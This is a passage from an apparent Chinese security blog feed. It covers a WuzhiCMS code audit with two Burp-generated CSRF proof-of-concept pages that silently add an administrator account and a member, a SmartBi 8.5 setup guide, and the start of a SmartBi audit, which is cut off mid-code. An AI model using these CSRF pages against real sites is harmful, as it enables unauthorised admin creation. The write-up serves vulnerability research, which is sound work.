class="hljs-string">&#x27;md5&#x27;</span>),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>);<br>                <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;form&#x27;</span>][<span class="hljs-string">&#x27;password&#x27;</span>]).<span class="hljs-variable">$factor</span>);<br>                <span class="hljs-variable">$formdata</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-variable">$password</span>;<br>                <span class="hljs-variable">$formdata</span>[<span class="hljs-string">&#x27;factor&#x27;</span>] = <span class="hljs-variable">$factor</span>;<br>            &#125;<br>            <span class="hljs-variable">$formdata</span>[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-string">&#x27;,&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;form&#x27;</span>][<span class="hljs-string">&#x27;role&#x27;</span>]).<span class="hljs-string">&#x27;,&#x27;</span>;<br>            <span class="hljs-variable">$formdata</span>[<span class="hljs-string">&#x27;truename&#x27;</span>] = <span class="hljs-title function_ invoke__">remove_xss</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;form&#x27;</span>][<span class="hljs-string">&#x27;truename&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-variable">$formdata</span>);<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation success&#x27;</span>));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$show_formjs</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$form</span> = <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;form&#x27;</span>);<br>            <span class="hljs-variable">$roles</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;admin_role&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>);<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;power_add&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>add函数用于添加管理员</p><p>是否点击提交操作——–判断用户名是否为空（不为空则将username值赋值给 $username ）——–从数据库中取出前台账户（不存在则添加会员）——是否已经是管理员（并且判断是否设置密码）———最后将修改内容添加到数据库中</p></li><li><p>通过抓包构造html</p><p>右击转到request，右击转到Engage tools → Generate CSRF PoC</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">url,fields</span>)</span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> p = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;form&quot;</span>);</span><br><span class="language-javascript">    p.<span class="hljs-property">action</span> = url;</span><br><span class="language-javascript">    p.<span class="hljs-property">innerHTML</span> = fields;</span><br><span class="language-javascript">    p.<span class="hljs-property">target</span> = <span class="hljs-string">&quot;_self&quot;</span>;</span><br><span class="language-javascript">    p.<span class="hljs-property">method</span> = <span class="hljs-string">&quot;post&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(p);</span><br><span class="language-javascript">    p.<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">csrf_hack</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> fields;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    fields += <span class="hljs-string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;form[role][]&#x27; value=&#x27;1&#x27; /&gt;&quot;</span>;</span><br><span class="language-javascript">    fields += <span class="hljs-string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;form[username]&#x27; value=&#x27;hack123&#x27; /&gt;&quot;</span>; </span><br><span class="language-javascript">    fields += <span class="hljs-string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;form[password]&#x27; value=&#x27;&#x27; /&gt;&quot;</span>; </span><br><span class="language-javascript">    fields += <span class="hljs-string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;form[truename]&#x27; value=&#x27;taoge@5ecurity&#x27; /&gt;&quot;</span>; </span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> url = <span class="hljs-string">&quot;http://127.0.0.1/www/index.php?m=core&amp;f=power&amp;v=add&amp;&amp;_su=wuzhicms&amp;_menuid=61&amp;_submenuid=62&amp;submit=提交&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-title function_">post</span>(url,fields);</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-title function_">csrf_hack</span>();&#125;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="复现7（csrf）"><a href="#复现7（csrf）" class="headerlink" title="复现7（csrf）"></a>复现7（csrf）</h2><p> 系统设置 &#x3D;&gt; 邮件服务器</p><p>（同上）</p><ol><li><p>通过抓包构造html，</p><p>右击转到request，右击转到Engage tools → Generate CSRF PoC</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">function post(url,fields)</span></span><br><span class="language-xml"><span class="language-handlebars">&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">var p = document.createElement(&quot;form&quot;);</span></span><br><span class="language-xml"><span class="language-handlebars">p.action = url;</span></span><br><span class="language-xml"><span class="language-handlebars">p.innerHTML = fields;</span></span><br><span class="language-xml"><span class="language-handlebars">p.target = &quot;_self&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars">p.method = &quot;post&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars">document.body.appendChild(p);</span></span><br><span class="language-xml"><span class="language-handlebars">p.submit();</span></span><br><span class="language-xml"><span class="language-handlebars">&#125;</span></span><br><span class="language-xml"><span class="language-handlebars">function csrf_hack()</span></span><br><span class="language-xml"><span class="language-handlebars">&#123;</span></span><br><span class="language-xml"><span class="language-handlebars">var fields;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;info[username]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;hack123&#x27;</span> /&gt;</span>&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;info[password]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;hacktest&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;info[pwdconfirm]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;hacktest&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;info[email]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;taoge@5ecurity.cn&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;info[mobile]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;modelids[]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;10&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;info[groupid]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;3&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;pids[]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;0&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;pids[]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;0&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;pids[]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;0&#x27;</span> /&gt;</span>&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;pids[]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;0&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;avatar&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;islock&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;0&#x27;</span> /&gt;</span>&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;sys_name&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;0&#x27;</span> /&gt;</span>&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;info[birthday]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;info[truename]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span> /&gt;</span>&quot;; </span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;info[sex]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;0&#x27;</span> /&gt;</span>&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars">fields += &quot;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;hidden&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;info[marriage]&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;0&#x27;</span> /&gt;</span>&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><br><span class="language-xml"><span class="language-handlebars">var url = &quot;http://127.0.0.1/www/index.php?m=member&amp;f=index&amp;v=add&amp;_su=wuzhicms&amp;_menuid=30&amp;_submenuid=74&amp;submit=提交&quot;;</span></span><br><span class="language-xml"><span class="language-handlebars">post(url,fields);</span></span><br><span class="language-xml"><span class="language-handlebars">&#125;</span></span><br><span class="language-xml"><span class="language-handlebars">window.onload = function() &#123; csrf_hack();&#125;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SmartBi-8.5搭建&amp;&amp;审计</title>
    <link href="/2025/10/27/SmartBi-8.5%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/SmartBi-8.5%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="SmartBi-8-5搭建"><a href="#SmartBi-8-5搭建" class="headerlink" title="SmartBi-8.5搭建"></a>SmartBi-8.5搭建</h1><h2 id="一、下载"><a href="#一、下载" class="headerlink" title="一、下载"></a>一、下载</h2><p>通过网盘分享的文件：SmartBi-8.5环境.zip<br>链接: <a href="https://pan.baidu.com/s/1bFYYEI9-g84IeLG_HoZlxA">https://pan.baidu.com/s/1bFYYEI9-g84IeLG_HoZlxA</a> 提取码: hqb4</p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173227241.png" alt="image-20250821000100076"></p><p> 用户名和公司名称随意 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173344611.png" alt="image-20250821000110498"></p><p>更改安装目录 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173349208.png" alt="image-20250821000121312"></p><p>此处，不要选择“安装演示库”，否则会报“报表数量超过限制”的错误</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173227245.png" alt="image-20250821000144553"></p><p>不选择“注册为Windows服务”，内存大小默认即可</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173357836.png" alt="image-20250821000156009"></p><p> 登录首页的密码 </p><h2 id="三、license获取"><a href="#三、license获取" class="headerlink" title="三、license获取"></a>三、license获取</h2><p>  官网地址：<a href="https://www.smartbi.com.cn/">https://www.smartbi.com.cn/</a> </p><p>license申请地址：<a href="https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html">https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html</a> </p><p>这里第一次进入需要注册\登录：</p><p>之后便可以申请了，邮箱要填正确，之后会将 license 发到邮箱里</p><p>选择个人版</p><p>之后在邮箱里可以看到发的：Smartbi-License.xml </p><p>获取 licence 后，将其放置在 E:\Smartbi\Tomcat\bin 文件夹 下</p><h2 id="四、创建数据库"><a href="#四、创建数据库" class="headerlink" title="四、创建数据库"></a>四、创建数据库</h2><p>首先连接 Smartbi ：</p><p>创建 Smartbi 数据库： </p><p>第一步连接好之后，是没有 smartbi 数据库的，需要自己创建  </p><p>下面是 MySQL 的配置： database-name 在选择安装“演示数据库”时是： smartbidemo ；咋们没有选择，所以默认是： smartbi</p><p>E:\Smartbi\Tomcat\bin\smartbi-config.xml </p><ul><li><p>解决浏览器版本误判  </p><p>这一步可以看下面问题中的 1、</p></li></ul><h2 id="五、启动程序"><a href="#五、启动程序" class="headerlink" title="五、启动程序"></a>五、启动程序</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>E:\Smartbi\Tomcat\bin\startup.cmd </p><p>运行 startup.cmd ，启动服务器  </p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>系统开始菜单中找到 Smartbi 的安装目录，单击启动Smartbi服务</p><p>没有报错的话，就是启动成功了， 若到这一步服务启动有错，重启电脑！！！</p><h2 id="六、配置程序"><a href="#六、配置程序" class="headerlink" title="六、配置程序"></a>六、配置程序</h2><p>访问Smartbi:首次访问，需输入密码，这里的密码随意，我的是 admin</p><p> 接下来的配置按照图中所示即可：</p><h2 id="七、进入主页"><a href="#七、进入主页" class="headerlink" title="七、进入主页"></a>七、进入主页</h2><p>  重启服务后，再次点击 访问Smartbi ，会进入下方页面：</p><p><a href="http://localhost:18080/smartbi/vision/index.jsp">http://localhost:18080/smartbi/vision/index.jsp</a> </p><p>首次访问登录页：</p><p> 此处的旧密码是 manager ，之后自行修改一个新密码：</p><p> 这是之后访问登录页：登录系统：</p><p>  至此，Smartbi v8.5 环境搭建完成。</p><h2 id="所遇问题"><a href="#所遇问题" class="headerlink" title="所遇问题"></a>所遇问题</h2><p>（按照上述方法安装后应该 不会有下列问题）： </p><h3 id="1、浏览器版本被错误检测"><a href="#1、浏览器版本被错误检测" class="headerlink" title="1、浏览器版本被错误检测"></a>1、浏览器版本被错误检测</h3><p>参考：<a href="https://www.xiaoheiwoo.com/windows-11-internet-explorer/">https://www.xiaoheiwoo.com/windows-11-internet-explorer/</a> </p><p>方法一：</p><p>从“管理加载项”窗口打开 Internet Explorer </p><p>IE中是可以通过 Internet属性 窗口，对浏览器进行功能设置的。</p><p>虽然 Win11默认找不到 IE的入口，但是 Internet属性 程序依然可以正常运行，我们可以点击其中的 管 理加载项 功能，打开 IE 浏览器。</p><p> 步骤：</p><ol><li><p>首先，按 Win + R 打开运行窗口</p></li><li><p>接下来，在运行命令框中输入 inetcpl.cpl </p></li><li><p>单击 确定 进入 Internet 属性窗口</p></li><li><p>选择 程序 选项卡，点击 管理加载项 按钮</p></li><li><p>然后，点击窗口底部 了解有关工具栏和扩展的详细信息</p></li><li><p>铛铛铛，你要的 IE浏览器出现啦~</p></li></ol><p>方法二：注释掉判断语句</p><p>进入 E:\Smartbi\Tomcat\webapps\smartbi\vision </p><p>找到文件 config.jsp </p><p>将判断部分注释掉  </p><h3 id="2、报表数量超过限制"><a href="#2、报表数量超过限制" class="headerlink" title="2、报表数量超过限制"></a>2、报表数量超过限制</h3><p>报这个问题是由于安装时选择了安装 演示数据库 ，不安装即可。</p><h3 id="3、配置完成后无法正确访问到登陆页面，一直重定向到配-置页"><a href="#3、配置完成后无法正确访问到登陆页面，一直重定向到配-置页" class="headerlink" title="3、配置完成后无法正确访问到登陆页面，一直重定向到配 置页"></a>3、配置完成后无法正确访问到登陆页面，一直重定向到配 置页</h3><p>问题： </p><p>如图，知识库连接成功，license上传成功。重启后访问 <a href="http://localhost:18080/smartbi">http://localhost:18080/smartbi</a> 仍然跳转到配 置页面 <a href="http://localhost:18080/smartbi/vision/config.jsp%E3%80%82">http://localhost:18080/smartbi/vision/config.jsp。</a></p><p> 配置完成后再次登录，显示服务启动不成功： </p><p> 数据库正常连接：</p><p> <strong>正常访问跳转的页面：</strong></p><p><a href="http://localhost:18080/smartbi/vision/index.jsp">http://localhost:18080/smartbi/vision/index.jsp</a> </p><p><a href="http://localhost:18080/smartbi/vision">http://localhost:18080/smartbi/vision</a> </p><p><a href="http://localhost:18080/smartbi">http://localhost:18080/smartbi</a> </p><p>都会重定向到 <a href="http://localhost:18080/smartbi/vision/config.jsp">http://localhost:18080/smartbi/vision/config.jsp</a>   </p><p>修改：</p><figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs golo">//<span class="hljs-keyword">var</span> chromeVer = ua.substr(chrome + <span class="hljs-number">7</span>,<span class="hljs-number">2</span>);<br>-&gt;<br><span class="hljs-keyword">var</span> <span class="hljs-keyword">match</span> = ua.<span class="hljs-keyword">match</span>(/chrome\/(\d+)/i);<br><span class="hljs-keyword">var</span> chromeVer = <span class="hljs-keyword">match</span> ? parseInt(<span class="hljs-keyword">match</span>[<span class="hljs-number">1</span>]) : <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>能正确识别浏览器版本，但没什么用 </p><h1 id="smartbi审计："><a href="#smartbi审计：" class="headerlink" title="smartbi审计："></a><strong>smartbi</strong>审计：</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SmartBI 是广州思迈特软件有限公司旗下的商业智能 BI 和数据分析品牌，是一款企业级大数据分析软件，能快速挖掘企业数据价值。集合<strong>数据可视化</strong>，<strong>探索性分析</strong>，<strong>自助式仪表盘</strong>以及<strong>一站式 ABI 平台</strong>，<strong>智慧数据运营平台</strong>，<strong>电子表格软件</strong>等等</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>版本：SmartBi V8.5         JDK 8</p><p>传参方式（直接传输，RMIServlet加密）</p><p><strong>RMIServlet加密</strong>、</p><p>先抓包，抓到的get，放行之后会出现post（smartbi程调用入口，是SmartBI 用自己的协议封装 HTTP 请求，把请求体加密后发给 RMIServlet）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /smartbi/vision/RMIServlet HTTP/1.1<br>Host: 192.168.1.8:18080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0<br>Accept: */*<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>If-Modified-Since: 0<br>Content-Type: application/x-www-form-urlencoded;charset=UTF-8<br>Content-Length: 69<br>Origin: http://192.168.1.8:18080<br>Connection: keep-alive<br>Referer: http://192.168.1.8:18080/smartbi/vision/index.jsp<br>Cookie: JSESSIONID=FA004C807237DA15E8841C4E8D2C02BF<br>Priority: u=0<br><br>encode=zDp4Wp4gRip+iIpiGZp4DRw6+/JV/uuu71&#x27;f11fuu/u7uu/NOuu/NO1m/uu/JT<br></code></pre></td></tr></table></figure><ol><li><p>追踪，RMIServlet加密的解密流程在 TraceFilter 的 doFilter ⽅法</p><p>（用 <strong>F12</strong> → Network → 点击这个 RMIServlet 请求 → 在 <strong>Initiator</strong> 或 <strong>调用栈</strong> 里看哪个 JS 文件生成了 <code>encode</code>）</p><p>Smartbi\Tomcat\bin\exts-smartbi\smartbiExtension4478727347500549277.tmp\META-INF\classes\smartbix\smartbi\filter\SmartbiXTraceFilter.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartbiXTraceFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TraceFilter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasStartup</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span> 